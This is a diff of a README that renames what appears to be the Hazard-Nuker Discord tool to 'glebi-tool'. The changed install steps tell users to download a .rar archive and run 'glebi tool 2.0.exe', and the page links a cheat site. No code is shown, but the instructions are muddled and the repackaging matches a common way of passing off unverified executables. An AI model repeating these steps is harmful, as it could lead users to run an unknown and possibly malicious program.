@@ -39,25 +39,26 @@ Code ✅
 
 ## Installation 
 
-#### Compiled Version
+#### exe Version
 ```sh-session
 https://github.com/Rdimo/Hazard-Nuker/releases
-Download the latest release (Hazard.zip) and extract the EXE to your desktop.
-And run it
+Download the latest release (glebi - tool.rar) and open folder.
+And run glebi tool 2.0.exe
 ```
 
 #### Source Code Version
 ```
 Click the green "Code" button.
 Click "Download ZIP"
-Extract the ZIP and run glebi tool 2.0.exe
+
+Extract the ZIP and Realese glebi tool 2.0
 ```
 
 ---
 
 🌟 **Enjoyed glebi-tool?** Consider dropping a star :)
 
-<a href="https://cheataway.com" target="_blank"><img src="https://discordapp.com/api/guilds/942426336348233799/widget.png?style=banner2" alt="Cheataway"/></a>
+<a href="https://cheataway.com" target="_blank"><img src="https://discord.com/api/guilds/790607156843905074/widget.json" alt="Cheataway"/></a>
 
 **glebi-tool was created by glebi.**
 
